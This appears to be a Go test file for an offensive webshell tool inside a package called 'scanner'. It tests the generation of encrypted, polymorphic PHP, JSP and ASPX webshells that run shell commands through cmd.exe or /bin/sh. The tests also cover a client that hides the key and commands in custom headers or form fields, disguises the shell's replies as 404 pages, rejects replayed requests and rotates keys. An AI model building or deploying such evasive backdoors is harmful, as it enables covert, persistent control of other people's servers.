package scanner

import (
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"
)

func testShellKey(t *testing.T) []byte {
	t.Helper()
	key, err := GenerateShellKey()
	if err != nil {
		t.Fatalf("generate key: %v", err)
	}
	return key
}

func buildTestV2Payload(t *testing.T, shellType string) ShellPayload {
	t.Helper()
	key := testShellKey(t)
	carrier, err := GenerateShellCarrier()
	if err != nil {
		t.Fatalf("generate carrier: %v", err)
	}
	payload, err := BuildShellPayloadV2(shellType, key, carrier)
	if err != nil {
		t.Fatalf("build v2 payload: %v", err)
	}
	return payload
}

func TestShellTokenRoundTrip(t *testing.T) {
	key := testShellKey(t)
	now := time.Unix(1700000000, 0)
	for _, mode := range []ShellCryptoMode{ShellCryptoGCM, ShellCryptoCBCHMAC} {
		t.Run(string(mode), func(t *testing.T) {
			token, err := sealShellToken(key, mode, []byte("E|d2hvYW1p"), now)
			if err != nil {
				t.Fatalf("seal: %v", err)
			}
			pt, err := openShellToken(key, mode, token, now.Add(30*time.Second))
			if err != nil {
				t.Fatalf("open: %v", err)
			}
			if string(pt) != "E|d2hvYW1p" {
				t.Fatalf("plaintext mismatch: %q", pt)
			}

			bad := []byte(token)
			i := len(bad) / 2
			if bad[i] == 'A' {
				bad[i] = 'B'
			} else {
				bad[i] = 'A'
			}
			if _, err := openShellToken(key, mode, string(bad), now); err == nil {
				t.Fatal("tampered token must be rejected")
			}
			if _, err := openShellToken(key, mode, token, now.Add(10*time.Minute)); err == nil {
				t.Fatal("expired token must be rejected")
			}
			other := testShellKey(t)
			if _, err := openShellToken(other, mode, token, now); err == nil {
				t.Fatal("token must not open with a different key")
			}
		})
	}
}

func TestShellTokenAuthenticatesTimestamp(t *testing.T) {
	key := testShellKey(t)
	now := time.Unix(1700000000, 0)
	token, err := sealShellToken(key, ShellCryptoGCM, []byte("P|"), now)
	if err != nil {
		t.Fatalf("seal: %v", err)
	}
	raw, err := base64.RawURLEncoding.DecodeString(token)
	if err != nil {
		t.Fatalf("decode: %v", err)
	}
	raw[13] ^= 0xff // timestamp is authenticated AAD; flipping it must break the tag
	forged := base64.RawURLEncoding.EncodeToString(raw)
	if _, err := openShellToken(key, ShellCryptoGCM, forged, now); err == nil {
		t.Fatal("forged timestamp must fail authentication, not merely the skew check")
	}
}

func TestBuildShellPayloadV2(t *testing.T) {
	for _, typ := range []string{"php", "jsp", "aspx"} {
		payload := buildTestV2Payload(t, typ)
		if payload.Protocol != ShellProtocolV2 || payload.Type != typ {
			t.Fatalf("%s payload metadata: %+v", typ, payload)
		}
		if len(payload.Key) != 32 || payload.Carrier == "" {
			t.Fatalf("%s payload missing key/carrier: %+v", typ, payload)
		}
		if payload.Content == "" || payload.Filename == "" {
			t.Fatalf("%s payload empty: %+v", typ, payload)
		}
		if !strings.Contains(payload.Content, base64.StdEncoding.EncodeToString(payload.Key)) {
			t.Fatalf("%s payload does not embed the generated key", typ)
		}
		if !strings.Contains(payload.Content, payload.Carrier) {
			t.Fatalf("%s payload does not embed the carrier %q", typ, payload.Carrier)
		}
		sum := sha256.Sum256([]byte(payload.Content))
		if payload.SHA256 != hex.EncodeToString(sum[:]) {
			t.Fatalf("%s payload sha256 mismatch", typ)
		}
		if strings.Contains(payload.Content, "pwd=") || strings.Contains(payload.Content, "password=") {
			t.Fatalf("%s payload leaks a cleartext credential parameter", typ)
		}
	}
	php := buildTestV2Payload(t, "php")
	for _, want := range []string{"openssl_decrypt", "aes-256-gcm", "http_response_code(404)", "sys_get_temp_dir", "cmd.exe", "_seen(", "gzencode"} {
		if !strings.Contains(php.Content, want) {
			t.Fatalf("PHP payload missing %q", want)
		}
	}
	if strings.Contains(php.Content, "$jw") || strings.Contains(php.Content, "function jw_") {
		t.Fatal("PHP payload still uses fixed identifiers")
	}
	again, err := BuildShellPayloadV2("php", php.Key, php.Carrier)
	if err != nil {
		t.Fatal(err)
	}
	if again.Content == php.Content {
		t.Fatal("two builds with the same key must differ (polymorphic identifiers)")
	}
	jsp := buildTestV2Payload(t, "jsp")
	for _, want := range []string{"AES/GCM/NoPadding", "GCMParameterSpec", "ConcurrentHashMap", "cmd.exe", "/bin/sh"} {
		if !strings.Contains(jsp.Content, want) {
			t.Fatalf("JSP payload missing %q", want)
		}
	}
	aspx := buildTestV2Payload(t, "aspx")
	for _, want := range []string{"HMACSHA256", "CipherMode.CBC", "HttpRuntime.Cache", "cmd.exe", "/bin/sh"} {
		if !strings.Contains(aspx.Content, want) {
			t.Fatalf("ASPX payload missing %q", want)
		}
	}
	if _, err := BuildShellPayloadV2("php", []byte("short"), "X-abcdef12"); err == nil {
		t.Fatal("short key must be rejected")
	}
	if _, err := BuildShellPayloadV2("php", testShellKey(t), "bad carrier!"); err == nil {
		t.Fatal("invalid carrier must be rejected")
	}
}

func TestGenerateShellCarrierFormat(t *testing.T) {
	seen := map[string]bool{}
	for i := 0; i < 50; i++ {
		c, err := GenerateShellCarrier()
		if err != nil {
			t.Fatalf("carrier: %v", err)
		}
		if !shellCarrierPattern.MatchString(c) {
			t.Fatalf("carrier %q does not match the protocol pattern", c)
		}
		if seen[c] {
			t.Fatalf("carrier collision: %q", c)
		}
		seen[c] = true
	}
}

func TestShellV2RequestHidesKey(t *testing.T) {
	payload := buildTestV2Payload(t, "php")
	req, err := payload.v2Request("http://target/shell.php", shellWireExec("whoami"))
	if err != nil {
		t.Fatalf("build request: %v", err)
	}
	keyB64 := base64.StdEncoding.EncodeToString(payload.Key)
	keyURL := base64.RawURLEncoding.EncodeToString(payload.Key)
	blob := req.Body
	for _, v := range req.Headers {
		blob += "\n" + v
	}
	if strings.Contains(blob, keyB64) || strings.Contains(blob, keyURL) {
		t.Fatal("request carries the webshell key")
	}
	if strings.Contains(blob, "whoami") {
		t.Fatal("request carries the command in cleartext")
	}
	if strings.HasPrefix(payload.Carrier, "X-") {
		if req.Headers[payload.Carrier] == "" || req.Body != "" {
			t.Fatalf("header carrier not used: %+v", req)
		}
	} else {
		if req.Body == "" || !strings.Contains(req.Body, payload.Carrier+"=") {
			t.Fatalf("form carrier not used: %+v", req)
		}
	}
}

func TestShellV2LargeTokenUsesFormBody(t *testing.T) {
	key := testShellKey(t)
	// Deterministic X- carrier: small requests must keep using the header, but
	// a 256 KiB file chunk would blow past Tomcat/nginx header limits.
	payload, err := BuildShellPayloadV2("php", key, "X-JWLargeToken")
	if err != nil {
		t.Fatal(err)
	}
	small, err := payload.v2Request("http://target/shell.php", shellWireExec("id"))
	if err != nil {
		t.Fatalf("small request: %v", err)
	}
	if small.Headers[payload.Carrier] == "" || small.Body != "" {
		t.Fatalf("small token should stay in the header: %+v", small)
	}
	bigCommand := strings.Repeat("A", shellTokenHeaderMax*2)
	big, err := payload.v2Request("http://target/shell.php", shellWireExec(bigCommand))
	if err != nil {
		t.Fatalf("big request: %v", err)
	}
	if len(big.Headers) != 0 || !strings.Contains(big.Body, payload.Carrier+"=") {
		t.Fatalf("big token should move to the form body: %+v", big)
	}
	if len(big.Body) <= shellTokenHeaderMax {
		t.Fatalf("big token form body is unexpectedly small: %d", len(big.Body))
	}
}

func TestDecodeShellResponseWithNoise(t *testing.T) {
	payload := buildTestV2Payload(t, "php")
	mode := ShellCryptoModeForType(payload.Type)
	out := base64.RawURLEncoding.EncodeToString([]byte("uid=0(root)"))
	token, err := sealShellToken(payload.Key, mode, []byte("OK|"+out), time.Now())
	if err != nil {
		t.Fatalf("seal response: %v", err)
	}
	body := "<br /><b>Warning</b>: something in <b>shell.php</b><br />\n" + token + "\n<!-- end -->"
	got, err := decodeShellResponse(payload, body)
	if err != nil {
		t.Fatalf("decode: %v", err)
	}
	if got != "uid=0(root)" {
		t.Fatalf("output mismatch: %q", got)
	}
	if _, err := decodeShellResponse(payload, "<html><h1>Not Found</h1></html>"); err == nil {
		t.Fatal("a 404 body must not decode as a valid response")
	}
}

func TestDecodeShellResponseCompressed(t *testing.T) {
	payload := buildTestV2Payload(t, "php")
	mode := ShellCryptoModeForType(payload.Type)
	out := strings.Repeat("jingwei-", 400)
	plain := shellResponsePlain([]byte(out))
	if !strings.HasPrefix(plain, "OK|1|") {
		t.Fatalf("large output was not compressed: %q", plain[:12])
	}
	token, err := sealShellToken(payload.Key, mode, []byte(plain), time.Now())
	if err != nil {
		t.Fatal(err)
	}
	got, err := decodeShellResponse(payload, "noise|"+token)
	if err != nil {
		t.Fatalf("decode compressed: %v", err)
	}
	if got != out {
		t.Fatalf("compressed roundtrip mismatch: %d != %d bytes", len(got), len(out))
	}
	// Empty responses use flag 0 so a ping still decodes to "".
	if plain := shellResponsePlain(nil); !strings.HasPrefix(plain, "OK|0||") {
		t.Fatalf("empty response format = %q", plain)
	}
}

// TestShellV2EndToEnd simulates a deployed shell with the Go implementation and
// exercises the client: liveness, command execution, replay rejection, rotation.
func TestShellV2EndToEnd(t *testing.T) {
	payload := buildTestV2Payload(t, "php")
	mode := ShellCryptoModeForType(payload.Type)

	var mu sync.Mutex
	key := append([]byte{}, payload.Key...)
	seen := map[string]bool{}

	readToken := func(r *http.Request) string {
		if strings.HasPrefix(payload.Carrier, "X-") {
			return r.Header.Get(payload.Carrier)
		}
		_ = r.ParseForm()
		return r.PostFormValue(payload.Carrier)
	}
	writeToken := func(w http.ResponseWriter, k []byte, plain string) {
		token, err := sealShellToken(k, mode, []byte(plain), time.Now())
		if err != nil {
			w.WriteHeader(500)
			return
		}
		_, _ = w.Write([]byte(token))
	}
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		token := readToken(r)
		if token == "" {
			w.WriteHeader(404)
			_, _ = w.Write([]byte("Not Found"))
			return
		}
		mu.Lock()
		defer mu.Unlock()
		pt, err := openShellToken(key, mode, token, time.Now())
		if err != nil || seen[token] {
			w.WriteHeader(404)
			_, _ = w.Write([]byte("Not Found"))
			return
		}
		seen[token] = true
		wire := string(pt)
		parts := strings.SplitN(wire, "|", 3)
		switch {
		case parts[0] == "P":
			writeToken(w, key, shellResponsePlain(nil))
		case parts[0] == "E" && len(parts) >= 2:
			cmd, derr := base64.RawURLEncoding.DecodeString(parts[1])
			if derr != nil {
				w.WriteHeader(404)
				return
			}
			writeToken(w, key, shellResponsePlain([]byte("out:"+string(cmd))))
		case parts[0] == "R" && len(parts) >= 2:
			nk, derr := base64.RawURLEncoding.DecodeString(parts[1])
			if derr != nil || len(nk) != 32 {
				w.WriteHeader(404)
				return
			}
			key = append([]byte{}, nk...)
			writeToken(w, key, shellResponsePlain(nil))
		default:
			w.WriteHeader(404)
		}
	}))
	defer srv.Close()

	client := NewDeepClient(5 * time.Second)
	alive, note := CheckShellAlive(context.Background(), client, srv.URL, payload)
	if !alive {
		t.Fatalf("alive check failed: %s", note)
	}
	out, err := RunShellCommand(context.Background(), client, srv.URL, payload, "id")
	if err != nil {
		t.Fatalf("run command: %v", err)
	}
	if out != "out:id" {
		t.Fatalf("output: %q", out)
	}
	// Replaying the exact same token must be refused by the shell.
	req, err := payload.v2Request(srv.URL, shellWirePing())
	if err != nil {
		t.Fatalf("build ping: %v", err)
	}
	client.Do(context.Background(), req)
	resp := client.Do(context.Background(), req)
	if resp.StatusCode != 404 {
		t.Fatalf("replayed token should get 404, got %d", resp.StatusCode)
	}

	newKey := testShellKey(t)
	if err := RotateShellKey(context.Background(), client, srv.URL, payload, newKey); err != nil {
		t.Fatalf("rotate: %v", err)
	}
	payload.Key = newKey
	out, err = RunShellCommand(context.Background(), client, srv.URL, payload, "whoami")
	if err != nil {
		t.Fatalf("run after rotation: %v", err)
	}
	if out != "out:whoami" {
		t.Fatalf("output after rotation: %q", out)
	}
}

func TestDecodeShellKey(t *testing.T) {
	key := testShellKey(t)
	for _, enc := range []string{
		base64.RawURLEncoding.EncodeToString(key),
		base64.URLEncoding.EncodeToString(key),
		base64.StdEncoding.EncodeToString(key),
	} {
		got, err := DecodeShellKey(enc)
		if err != nil {
			t.Fatalf("decode %q: %v", enc, err)
		}
		if string(got) != string(key) {
			t.Fatalf("key mismatch for %q", enc)
		}
	}
	if _, err := DecodeShellKey("not-a-key"); err == nil {
		t.Fatal("invalid key must be rejected")
	}
}
